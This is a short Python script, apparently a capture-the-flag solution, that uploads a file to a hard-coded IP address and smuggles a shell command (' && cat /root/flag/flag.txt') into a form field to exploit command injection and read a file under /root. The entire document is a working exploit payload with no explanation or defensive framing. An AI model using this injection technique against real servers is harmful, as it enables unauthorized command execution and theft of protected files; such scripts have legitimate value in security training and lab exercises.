import requests

URL = "http://43.229.15.250:12000/" # uploadifive-image-only.php
file = open("./test.txt", "rb")

res = requests.post(URL, files={"fileData": file}, data={"data": " && cat /root/flag/flag.txt"})

print(res.status_code)
print(res.text)

